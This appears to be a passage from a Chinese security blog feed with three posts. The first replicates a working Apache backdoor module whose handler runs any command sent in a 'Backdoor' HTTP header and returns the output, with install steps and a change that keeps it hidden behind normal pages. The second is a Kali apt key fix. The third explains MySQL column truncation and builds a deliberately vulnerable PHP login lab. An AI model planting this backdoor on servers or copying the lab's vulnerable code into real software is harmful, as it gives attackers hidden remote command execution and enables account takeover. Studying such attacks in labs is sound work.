1998 14:42:22 GMT</div><div class="line">**    Server: Apache/1.3.4 (Unix)</div><div class="line">**    Connection: close</div><div class="line">**    Content-Type: text/html</div><div class="line">**</div><div class="line">**    The sample page from mod_backdoor.c</div><div class="line">*/</div><div class="line"></div><div class="line">#include &quot;httpd.h&quot;</div><div class="line">#include &quot;http_config.h&quot;</div><div class="line">#include &quot;http_protocol.h&quot;</div><div class="line">#include &quot;ap_config.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">/* The sample content handler */</div><div class="line">static int backdoor_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">    if (strcmp(r-&gt;handler, &quot;backdoor&quot;)) &#123;</div><div class="line">        return DECLINED;</div><div class="line">    &#125;</div><div class="line">    r-&gt;content_type = &quot;text/html&quot;;</div><div class="line"></div><div class="line">    if (!r-&gt;header_only)</div><div class="line">        ap_rputs(&quot;The sample page from mod_backdoor.c\n&quot;, r);</div><div class="line">    */</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    char FLAG = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line"></div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        if(strcmp(e[i].key, &quot;Backdoor&quot;) == 0)&#123;</div><div class="line">            FLAG = 1;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (FLAG)&#123;</div><div class="line">        char * command = e[i].val;</div><div class="line">        ap_rprintf(r, &quot;Command: %s\n&quot;, command);</div><div class="line">        ap_rprintf(r, &quot;Result: \n&quot;, command);</div><div class="line">        FILE* fp = popen(command,&quot;r&quot;);</div><div class="line">        char buffer[0x100] = &#123;0&#125;;</div><div class="line">        int counter = 1;</div><div class="line">        while(counter)&#123;</div><div class="line">            counter = fread(buffer, 1, sizeof(buffer), fp);</div><div class="line">            ap_rwrite(buffer, counter, r);</div><div class="line">        &#125;</div><div class="line">        pclose(fp);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void backdoor_register_hooks(apr_pool_t *p)</div><div class="line">&#123;</div><div class="line">    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* Dispatch list for API hooks */</div><div class="line">module AP_MODULE_DECLARE_DATA backdoor_module = &#123;</div><div class="line">    STANDARD20_MODULE_STUFF,</div><div class="line">    NULL,                  /* create per-dir    config structures */</div><div class="line">    NULL,                  /* merge  per-dir    config structures */</div><div class="line">    NULL,                  /* create per-server config structures */</div><div class="line">    NULL,                  /* merge  per-server config structures */</div><div class="line">    NULL,                  /* table of config file commands       */</div><div class="line">    backdoor_register_hooks  /* register hooks                      */</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>接着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -a -i -c mod_backdoor.c &amp;&amp; service apache2 restart</div></pre></td></tr></table></figure></p><p>来启动backdoor这个module。</p><p>就可以看到成果了<br><img src="https://i.imgur.com/QHbNHkQ.png" alt=""></p><p>但是问题也来了<br>原来的主页–phpinfo页面<br><img src="https://i.imgur.com/h70UVxV.png" alt=""></p><p>现在的主页<br><img src="https://i.imgur.com/Pyhkj9p.png" alt=""></p><p>也就是说添加了这个module之后，一个正常的没有添加Backdoor请求头的请求会无法得到正确响应。</p><p>然后参考文章文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/ConeZXY/article/details/1897989</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898000</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898019</div><div class="line">http://zjwyhll.blog.163.com/blog/static/7514978120126254222294/</div><div class="line">http://www.apachetutor.org/dev/request</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/9jJq8rE.png" alt=""><br>如果返回 OK , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且没有发生错误<br>如果返回 DONE , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且已经不需要再进行后续的处理了<br>如果返回 DECLINED , 则表示这个模块不需要对这个请求进行处理 , 那么服务器就会继续对其进行默认的处理</p><p>我们将原先代码中的返回值由OK改成DECLINED试试<br><img src="https://i.imgur.com/f6NrLtw.png" alt=""><br>正常执行了命令，且把phpinfo给显示了出来<br>如果不发送Backdoor请求头<br><img src="https://i.imgur.com/dEjDVnT.png" alt=""><br>正常的phpinfo页面<br><br></p><p>通过这次实验的学习，我对于apache环境的搭建以及apache请求头这些配置啊模块啊都有了一定的了解，同时也还是好菜…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现一下一航大佬的博客里的实验。&lt;br&gt;
    
    </summary>
    
    
      <category term="后门" scheme="http://Err0rzz.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Kali2018更新问题</title>
    <link href="http://Err0rzz.github.io/2018/03/05/Kali2018%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/"/>
    <id>http://Err0rzz.github.io/2018/03/05/Kali2018更新问题/</id>
    <published>2018-03-05T07:51:16.000Z</published>
    <updated>2018-03-27T08:24:58.482Z</updated>
    
    <content type="html"><![CDATA[<p>新学期第一篇，原本打算开开心心的打开kali复现一航师傅的实验，然而被kali的更新给搞了<br><a id="more"></a></p><p>首先是说签名的问题，然后我去百度了一波，在贴吧里找到大神的分析，偷一波:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">首先，这个问题其实也出现在近期 Ubuntu 系统的更新上。</div><div class="line"></div><div class="line"></div><div class="line">Kali 和 Ubuntu 都是基于 Debian 的发行版，因此都继承使用了 apt 包管理器。为了保证更新软件包的可靠性，更新服务器会使用GPG对发布的所有数据包进行签名，以此来防止数据包被篡改或者冒名顶替。</div><div class="line"></div><div class="line"></div><div class="line">说到GPG就必须先要说一下PGP（Pretty Good Privacy），它们都是OpenPGP标准的具体软件实现。上世纪90年代初 Phil Zimmermann 开发了PGP，用以保护个人和商业机构数据的隐私，很快就受到了普遍的欢迎和采用。</div><div class="line"></div><div class="line"></div><div class="line">但有一个问题，PGP是个商业软件，据说价格还挺贵。于是 GNU 组织依据 OpenPGP 标准开发了开源免费的 GPG，从此受到开源世界的普遍采用，尤其是类 Unix 系统平台。它的全名为 GnuPG（GNU Privacy Guard）。</div><div class="line"></div><div class="line"></div><div class="line">由于基于相同的技术标准，所以在原理上这两软件是相同的，它们都是基于公钥算法来实现数据的加密和身份验证。公钥算法即『非对称算法』。一次数学运算，生成两个密钥，即公钥和私钥。公钥加密的数据只有私钥能解密，反之亦然。公钥是发布出来给别人用的，因此不需要考虑机密性，谁获得都行。而用公钥加密的数据，只有对应的私钥才能解密，因此私钥的机密性是公钥加密体系的根基，一旦私钥泄漏，即无秘密可言。反过来私钥的持有者，也可以用私钥来加密数据发给他人，当数据接收者用对应的公钥解密了数据，则反向证明数据一定来自于私钥的持有者，因此私钥加密数据的过程被称为签名，是对数据发送者身份的证明。</div><div class="line"></div><div class="line"></div><div class="line">apt 包管理系统同样采用了 GPG 加密验证方式。Kali Linux 官方拥有自己的 GPG 公私钥对，公钥被其部署在每一个安装了Kali Linux系统的计算机中。同时官方所有的更新包都使用自己的私钥进行了签名，客户端会使用自己计算机中 Kali 官方的公钥来对这个签名进行验证，以此来确保更新数据包确实来自于Kali官方，并且传输过程中没有被篡改。</div><div class="line"></div><div class="line">这次 Kali 更新时的报错信息就明确说明原因是密钥过期，同时给出了过期密钥的 ID。</div><div class="line">简单来理解，公钥和私钥都是个密码。但即使再复杂的密码，如果用的时间足够长的话，都有可能被破解（尤其是在这个量子计算飞速发展的时代）。因此每个公私钥对在生成的时候，都要设置一个有效期，密钥一旦过期，则被视为不再安全。通常密钥有效期以年为时间单位，一般不超过 5 年。</div><div class="line">其实我们可以运行下面的命令来查看系统里所有的密钥信息：</div><div class="line"># apt-key list</div><div class="line"></div><div class="line"></div><div class="line">输出结果的最后一行就是导致这次问题的公钥，到期时间是2018年2月2日（有效期大约是 6 年）。</div><div class="line"></div><div class="line"></div><div class="line">既然是Kali官方的密钥过期，那就需要 Kali 官方自己先更新一下，然后再把更新后的公钥发给我们。其实这件事Kali官方已经做了，但作为 Kali 系统使用者的我们，也要更新一下自己电脑中的对应公钥。</div><div class="line"></div><div class="line"></div><div class="line">获得新的公钥可以有几种方法，我们可以到Kali官方的密钥下载站上自己下载，然后将下载的新公钥导入自己系统。这个过程可以通过系统命令直接完成，也可以手动下载后，再使用系统命令导入密钥。</div><div class="line"></div><div class="line"></div><div class="line">我们也可以从GPG的密钥发布服务器上下载Kali的新公钥。是的，GPG 是有自己官方密钥发布服务器的。作为一个受信的仲裁方，GPG 在全球提供大量的密钥服务器，这些服务器之间会进行定期的数据同步，我们可以任选一个 GPG 密钥服务器来下载密钥。这些服务器也是我们用来验证密钥所有者的重要途径。</div><div class="line">具体更新方法有以下几种方法：（任选一种即可）</div><div class="line">1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6</div><div class="line">2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add</div><div class="line">3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6</div><div class="line"># gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add -</div><div class="line">4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb</div><div class="line"># apt install ./kali-archive-keyring_2018.1_all.deb</div><div class="line">成功更新密钥之后，我们就可以正常的 update / upgrade 了。</div><div class="line"></div><div class="line"></div><div class="line">其实作为普通用户，我们每个人都可以生成自己的 GPG 密钥对，然后把公钥发布到 GPG 官方服务器上。这样的话，如果我要加密数据发送给你，就可以获取并使用你的公钥来进行加密，这样加密的数据就只有你能解密，因为只有你才有自己的私钥。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">整个这个过程和证书加密的PKI架构非常相似。</div></pre></td></tr></table></figure></p><p>一开始根据方法二，但是不知道是什么原因，虽然命令输入进去之后返回OK，但是重新update之后还是报错。</p><p>然后根据上面的方法一搞定了签名问题。</p><p>紧接着就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">仓库 “http://mirrors.ustc.edu.cn/kali sana Release” 没有 Release 文件。</div><div class="line">N: 无法认证来自该源的数据，所以使用它会带来潜在风险。</div><div class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</div><div class="line">W: 仓库 “http://mirrors.ustc.edu.cn/kali-security sana/updates Release” 没有 Release 文件。</div><div class="line">N: 无法认证来自该源的数据，所以使用它会带来潜在风险。</div><div class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</div><div class="line">E: 无法下载 http://mirrors.ustc.edu.cn/kali/dists/sana/main/binary-amd64/Packages 404 Not Found [IP: 202.141.176.110 80]</div><div class="line">E: 无法下载 http://mirrors.ustc.edu.cn/kali-security/dists/sana/updates/main/source/Sources 404 Not Found [IP: 202.141.176.110 80]</div><div class="line">E: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。</div></pre></td></tr></table></figure></p><p>说我源有问题。我又去百度了一波，因为我的源是网上随便找的阿里源，好像说是sana的源已经停止了更新，就去换了波kali-rolling的安装源:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</div></pre></td></tr></table></figure></p><p>把原先/etc/apt/source.list里的源注释掉之后，再把上面这句话写进去。</p><p>接着就可以apt-get update慢慢等了。</p><p><br></p><p>今天在docker里想安装个工具，结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Biicseh.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">W: Size of file /var/lib/apt/lists/mirrors.aliyun.com_ubuntu_dists_trusty-updates_multiverse_source_Sources.gz is not what the server reported 7230 7618</div></pre></td></tr></table></figure></p><p>然后此时我以为是源的问题，就按照上面的教程去把源给改了，再开开心心的update一下：<br> <img src="https://i.imgur.com/3NoSuH6.png" alt=""><br>QAQ..</p><p>再去研究一下刚才那个错误，发现好像只需要将<code>/var/lib/apt/lists/</code>目录下所有文件删除就好了，如果去换源，反而其他工具会出错。</p><p>所以改了之后再update<br><img src="https://i.imgur.com/6y7LJTk.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新学期第一篇，原本打算开开心心的打开kali复现一航师傅的实验，然而被kali的更新给搞了&lt;br&gt;
    
    </summary>
    
    
      <category term="环境问题" scheme="http://Err0rzz.github.io/tags/%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>SQL截断攻击</title>
    <link href="http://Err0rzz.github.io/2018/02/01/SQL%E6%88%AA%E6%96%AD%E6%94%BB%E5%87%BB/"/>
    <id>http://Err0rzz.github.io/2018/02/01/SQL截断攻击/</id>
    <published>2018-02-01T06:07:59.000Z</published>
    <updated>2018-02-02T07:38:49.791Z</updated>
    
    <content type="html"><![CDATA[<p>2008年，Stefan Esser提出一种名为”SQL Column Truncation”攻击方式，就是以上说的SQL截断攻击。</p><a id="more"></a><p>在MYSQL的配置中，有一个sql_mode选项。当MYSQL的sql_mode设置为<strong>default</strong>的时候，即没有开启<strong>STRICT_ALL_TABLES</strong>的时候，MYSQL对于用户插入的超长值只会提示warning，而不是error(如果是error则插入不成功)，这可能会导致一些“截断”问题。</p><p>测试过程如下(MYSQL 5)。</p><p>首先开启strict模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set @@sql_mode=&quot;STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/9alfM2H.png" alt=""></p><p>在该模式下，因为输入的字符串超出了字符限制，因此数据库返回一个error信息，同时数据插入不成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create table strict_test(</div><div class="line">-&gt; id int not null auto_increment,</div><div class="line">-&gt; username varchar(10),</div><div class="line">-&gt; password varchar(10),</div><div class="line">-&gt; primary key(id));</div><div class="line">Query OK, 0 rows affected (0.09 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from strict_test;</div><div class="line">Empty set (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; show columns from strict_test;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(11)     | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(10) | YES  |     | NULL    |                |</div><div class="line">| password | varchar(10) | YES  |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into strict_test(username,password) values(&apos;admin&apos;,&apos;pass&apos;);</div><div class="line">Query OK, 1 row affected (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from strict_test;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | admin    | pass     |</div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into strict_test(username,password) values(&apos;admin     x&apos;,&apos;new_pass&apos;);</div><div class="line">ERROR 1406 (22001): Data too long for column &apos;username&apos; at row 1</div><div class="line"></div><div class="line">mysql&gt; select * from strict_test;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | admin    | pass     |</div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p><p>当关闭strict选项时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set @@sql_mode=&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure></p><p>再次插入刚才那条数据，数据库只返回一个warning，但数据插入成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into strict_test(username,password) values(&apos;admin     x&apos;,&apos;new_pass&apos;);</div><div class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from strict_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">|  1 | admin      | pass     |</div><div class="line">|  2 | admin      | new_pass |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure></p><p>此时就可以绕过身份认证登陆admin的账号，造成越权访问。</p><p>在这个问题公布后不久，WordPress就出现了一个真实案例：</p><p>注册一个用户名为”admin(55个空格)x”的用户，就可以修改原管理员的密码了。但是因为攻击者在此只能修改管理员的密码，而新密码仍然会发送到管理员的邮箱，所以并没有造成严重的后果(该wp版本为2.6.1)<br><br><br>闲着没事干，自己搭了个小题目来强化记忆一下。</p><p>index.html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">&lt;title&gt;小哥哥小姐姐快来玩&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;a href=&quot;login.php&quot;&gt;登陆&lt;/a&gt;</div><div class="line">&lt;a href=&quot;register.php&quot;&gt;注册&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>login.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;); </div><div class="line">$conn = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;toor&quot;);</div><div class="line">mysql_select_db(&quot;zz_test&quot;) or die(&quot;数据库失败！&quot;);</div><div class="line"></div><div class="line">$_SESSION[&apos;isadmin&apos;]=0;</div><div class="line">$_SESSION[&apos;isguest&apos;]=0;</div><div class="line"></div><div class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</div><div class="line">$uname=addslashes($_POST[&apos;username&apos;]);</div><div class="line">$pw=addslashes($_POST[&apos;password&apos;]);</div><div class="line">$sql=&quot;select * from strict_test where username=&apos;$uname&apos;&quot;;</div><div class="line">$query=mysql_query($sql);</div><div class="line">// echo mysql_num_rows($query);</div><div class="line">while($row=mysql_fetch_array($query))&#123;</div><div class="line">if($row[&apos;password&apos;]===$pw )&#123;</div><div class="line">if($uname===&quot;admin&quot;)&#123;</div><div class="line">$_SESSION[&apos;isadmin&apos;]=1;</div><div class="line">header(&apos;location: ./flag.php&apos;);</div><div class="line">exit;</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">$_SESSION[&apos;isguest&apos;]=1;</div><div class="line">header(&apos;location:./guest.php&apos;);</div><div class="line">exit;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;用户名或者密码错误！&apos;);history.back();&lt;/script&gt;&quot;;  </div><div class="line">    exit; </div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;  </div><div class="line">&lt;html lang=&quot;en&quot;&gt;  </div><div class="line">&lt;head&gt;  </div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;  </div><div class="line">    &lt;title&gt;登录&lt;/title&gt;  </div><div class="line">&lt;/head&gt;  </div><div class="line">&lt;body&gt;  </div><div class="line">    &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;  </div><div class="line">        用户名： &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;  </div><div class="line">        密码： &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;  </div><div class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;  </div><div class="line">    &lt;/form&gt;  </div><div class="line">&lt;/body&gt;  </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>register.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;); </div><div class="line">try&#123;</div><div class="line">    $conn = new PDO( &quot;mysql:host=localhost;dbname=zz_test&quot;,&quot;root&quot;, &quot;toor&quot;);</div><div class="line">&#125;catch(PDDException $e)&#123;</div><div class="line">    echo&quot;数据库连接错误&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</div><div class="line">$uname=$_POST[&apos;username&apos;];</div><div class="line">$pw=$_POST[&apos;password&apos;];</div><div class="line">    if($uname===&quot;admin&quot;)&#123;</div><div class="line">        echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;用户已存在&apos;);location.href=&apos;index.html&apos;;&lt;/script&gt;&quot;;  </div><div class="line">        exit;</div><div class="line">    &#125;</div><div class="line">$sql=&quot;insert into strict_test(username,password) values(?,?)&quot;;</div><div class="line">$stmt=$conn-&gt;prepare($sql);</div><div class="line">    $data=array(0=&gt;$uname,1=&gt;$pw );</div><div class="line">    $stmt-&gt;execute($data);</div><div class="line">echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;注册成功&apos;);location.href=&apos;index.html&apos;;&lt;/script&gt;&quot;;  </div><div class="line">    exit;</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;  </div><div class="line">&lt;html lang=&quot;en&quot;&gt;  </div><div class="line">&lt;head&gt;  </div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;  </div><div class="line">    &lt;title&gt;注册&lt;/title&gt;  </div><div class="line">&lt;/head&gt;  </div><div class="line">&lt;body&gt;  </div><div class="line">    &lt;form action=&quot;register.php&quot; method=&quot;post&quot;&gt;  </div><div class="line">        用户名： &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;  </div><div class="line">        密码： &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;  </div><div class="line">        &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt;  </div><div class="line">    &lt;/form&gt;  </div><div class="line">&lt;/body&gt;  </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>flag.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if($_SESSION[&apos;isadmin&apos;]===1)&#123;</div><div class="line">echo &quot;here is your flag:ZJGSU&#123;zz_is_handsome!&#125;&quot;;</div><div class="line">&#125;</div><div class="line">else </div><div class="line">echo &quot;you are not admin!&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>guest.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if($_SESSION[&apos;isguest&apos;]===1)&#123;</div><div class="line">echo &quot;this is no flag!Only admin can get the flag!&quot;;</div><div class="line">&#125;</div><div class="line">else echo &quot;who are you?&quot;;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>test.sql:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create database zz_test;</div><div class="line">use zz_test;</div><div class="line">create table strict_test(id int not null auto_increment,username varchar(10),password varchar(10),primary key(id));</div><div class="line">insert into strict_test(username,password) values(&apos;admin&apos;,&apos;asdf&apos;);</div><div class="line">set 